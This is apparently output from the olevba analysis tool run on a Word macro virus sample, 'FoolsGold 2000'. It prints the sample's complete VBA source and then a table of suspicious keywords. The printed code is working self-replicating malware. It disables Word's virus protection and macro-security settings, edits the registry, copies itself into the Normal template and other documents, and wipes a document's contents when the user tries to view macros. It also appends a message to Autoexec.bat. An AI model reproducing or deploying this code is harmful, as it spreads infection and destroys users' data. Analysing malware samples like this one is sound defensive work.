olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fool.bas 
in file: Virus.MSWord.Fool.p - OLE stream: 'Macros/VBA/Fool'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' FoolsGold 2000 Virus V1.20 (c) The WaLRuS 01/00

Sub AutoOpen()
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.VBProject.VBComponents("Fool").Export "c:\Fool.drv"
    SetAttr "c:\Fool.drv", 6
    ActiveDocument.ReadOnlyRecommended = False
    If (Second(Now()) > 50) Then System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WaLRuS"
    If NormalTemplate.VBProject.VBComponents.Item("Fool").Name <> "Fool" Then Norinfected = True
    If ActiveDocument.VBProject.VBComponents.Item("Fool").Name <> "Fool" Then Docinfected = True
    If Norinfected = True And Docinfected = False Then Set eggman = NormalTemplate.VBProject.VBComponents
    If Norinfected = False And Docinfected = True Then Set eggman = ActiveDocument.VBProject.VBComponents
    eggman.import "c:\Fool.drv"
    If Norinfected = False Then ActiveDocument.SaveAs filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    If Docinfected = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "FoolsGold 2000 by The WaLRuS", vbInformation
    Assistant.Visible = True
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "FoolsGold 2000 Thanks You!"
    .Heading = "GREETINGS"
    .Show
    End With
    Call Windoze
End Sub

Sub Windoze()
On Error Resume Next
    SetAttr "C:\Autoexec.bat", 0
    Open "C:\Autoexec.bat" For Append As #1
    Print #1, "CLS"
    Print #1, "ECHO                ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·"
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  *  FoolsGold 2000 Virus by The WaLRuS   *  º"
    Print #1, "ECHO                º  *****************************************  º"
    Print #1, "ECHO                º  The Fools Gold Virus wishes to thank the   º"
    Print #1, "ECHO                º  user of this computer because you have     º"
    Print #1, "ECHO                º  helped to spread the good words of peace!  º"
    Print #1, "ECHO                º  WaLRuS                                     º"
    Print #1, "ECHO                ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½"
    Close #1
Finish:
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Call Stealthy
End Sub

Sub FileTemplates()
    On Error Resume Next
    Call Stealthy
End Sub

Sub ViewVBCode()
    On Error Resume Next
    Call Stealthy
End Sub

Sub Stealthy()
    On Error Resume Next
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Call Windoze
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

